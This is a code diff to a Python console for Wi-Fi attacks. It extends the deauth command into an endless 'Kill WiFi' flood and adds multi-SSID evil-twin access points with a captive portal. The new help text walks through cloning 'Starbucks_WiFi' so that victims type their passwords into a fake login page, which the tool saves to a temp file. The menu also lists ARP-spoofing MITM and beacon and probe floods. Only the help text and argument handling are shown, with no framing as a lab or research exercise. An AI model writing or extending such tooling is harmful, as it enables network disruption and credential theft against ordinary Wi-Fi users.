@@ -300,12 +300,12 @@ class WirelessConsole(cmd.Cmd):
                 ("wep crack       <pcap> [--method ptw|fms|korek]", "Crack WEP key", "wep crack wep.pcap"),
             ]),
             ("WIRELESS ATTACKS", [
-                ("deauth          <iface> <bssid> [station] [--count]", "Deauth specific client", "deauth wlan0 AA:BB:CC --count 20"),
-                ("deauth broadcast <iface> <bssid> [--count]", "Deauth all clients", "deauth broadcast wlan0 AA:BB:CC"),
+                ("deauth          <iface> <bssid> [station]", "Kill WiFi — infinite raw deauth (Ctrl+C)", "deauth wlan0 AA:BB:CC DD:EE:FF"),
+                ("deauth broadcast <iface> <bssid>", "Deauth all clients from AP", "deauth broadcast wlan0 AA:BB:CC"),
                 ("beacon-flood    <iface> [--ssid <name>] [--count]", "Flood fake beacons", "beacon-flood wlan0 --ssid <name>"),
                 ("beacon-flood    <iface> [--file <ssids.txt>]", "Multi-SSID beacon flood", "beacon-flood wlan0 --file ssids.txt"),
                 ("probe-flood     <iface> [--count] [--random-mac]", "Probe request flood", "probe-flood wlan0 --count 1000"),
-                ("eviltwin        <iface> <ssid> [--channel] [--captive]", "Clone SSID rogue AP", "eviltwin wlan0 <name> --channel 6"),
+                ("eviltwin        <iface> <ssid> [--channel 6] [--sum 3] [--captive]", "Clone SSID rogue AP with captive portal", "eviltwin wlan0 <name> --sum 5 --captive"),
                 ("rogue           <iface> [--ssid <name>] [--channel]", "Start rogue AP", "rogue wlan0 --ssid <name>"),
                 ("arp-spoof       <target> <gateway> [--full-duplex]", "ARP poisoning MITM", "arp-spoof 198.51.100.100 198.51.100.1"),
                 ("forward         <on|off> [--persist]", "Toggle IP forwarding", "forward on"),
@@ -381,19 +381,19 @@ class WirelessConsole(cmd.Cmd):
         console.print("  [dim]  → Tests 100k+ passwords/sec against captured PMKID[/dim]")
 
     def help_deauth(self):
-        console.print("[bold cyan]deauth <iface> <bssid> [station] [count] [reason][/bold cyan]")
-        console.print("  [bold cyan]deauth broadcast <iface> <bssid>[/bold cyan]")
-        console.print("  Send 802.11 deauthentication frames to disconnect clients.")
-        console.print("  [dim]Real case: deauth wlan0 AA:BB:CC:DD:EE:FF FF:FF:FF:FF:FF:FF 5 7[/dim]")
-        console.print("  [dim]  → Kicks all clients off AP (reason 7 = class 3 frame nonce)[/dim]")
-        console.print("  [dim]  → Clients reconnect → capture handshake[/dim]")
+        console.print("[bold cyan]deauth <iface> <bssid> [station] [--reason <code>] [--channel <ch>][/bold cyan]")
+        console.print("  Kill WiFi — infinite raw 802.11 deauth (Ctrl+C to stop)")
+        console.print("  [dim]Real case: deauth wlan0 AA:BB:CC:DD:EE:FF[/dim]")
+        console.print("  [dim]  → Sends raw deauth frames until Ctrl+C[/dim]")
+        console.print("  [dim]  → Add [station] for targeted deauth (dual-direction)[/dim]")
 
     def help_eviltwin(self):
-        console.print("[bold cyan]eviltwin <iface> <ssid> [channel][/bold cyan]")
-        console.print("  Clone a legitimate SSID and broadcast beacon frames.")
-        console.print("  [dim]Real case: eviltwin wlan0 Starbucks_WiFi 6[/dim]")
-        console.print("  [dim]  → Clients see 'Starbucks_WiFi' with stronger signal[/dim]")
-        console.print("  [dim]  → Combine with rogue AP + captive portal for phishing[/dim]")
+        console.print("[bold cyan]eviltwin <iface> <ssid> [--channel 6] [--sum 3] [--captive][/bold cyan]")
+        console.print("  Clone SSID and broadcast beacon frames. With --sum N, create N fake SSIDs.")
+        console.print("  With --captive, start DHCP+DNS+HTTP server with fake login page.")
+        console.print("  [dim]Real case: eviltwin wlan0 Starbucks_WiFi --channel 6 --sum 5 --captive[/dim]")
+        console.print("  [dim]  → 5 fake SSIDs visible, connecting shows login page[/dim]")
+        console.print("  [dim]  → Victim enters password → saved to /tmp/eviltwin_creds.txt[/dim]")
 
     def help_wps(self):
         console.print("[bold cyan]wps scan <iface>[/bold cyan]")
@@ -1215,21 +1215,22 @@ Usage: probe-flood <iface> [--count <n>] [--ssids <file>] [--interval <ms>] [--r
 
     def do_eviltwin(self, arg):
         """Clone SSID rogue AP.
-Usage: eviltwin <iface> <ssid> [--channel <ch>] [--wpa2] [--wpa3] [--captive]
+Usage: eviltwin <iface> <ssid> [--channel <ch>] [--sum <n>] [--captive]
        eviltwin <iface> <ssid> [--output <file>] [--bssid <mac>] [--dhcp-range <cidr>]"""
         KNOWN = {"--wpa2", "--wpa3", "--captive", "--verbose"}
-        FLAG_VAL = {"--channel": int, "--output": str, "--bssid": str, "--dhcp-range": str}
+        FLAG_VAL = {"--channel": int, "--sum": int, "--output": str, "--bssid": str, "--dhcp-range": str}
         pos, flags = _parse_flags(arg.split(), KNOWN, FLAG_VAL)
         if len(pos) < 2:
-            UI.print_error("Usage: eviltwin <iface> <ssid> [--channel 6] [--captive]")
+            UI.print_error("Usage: eviltwin <iface> <ssid> [--channel 6] [--sum 3] [--captive]")
             return
         iface = pos[0]
         ssid = pos[1]
         channel = flags.get("--channel", 6)
+        num_fake = flags.get("--sum", 0)
         caps = []
         if "--wpa2" in flags: caps.append("wpa2")
         if "--wpa3" in flags: caps.append("wpa3")
-        self.executor.do_eviltwin(iface, ssid, channel, caps=caps,
+        self.executor.do_eviltwin(iface, ssid, channel, num_fake=num_fake, caps=caps,
                                    captive="--captive" in flags,
                                    bssid=flags.get("--bssid"),
                                    dhcp_range=flags.get("--dhcp-range"))
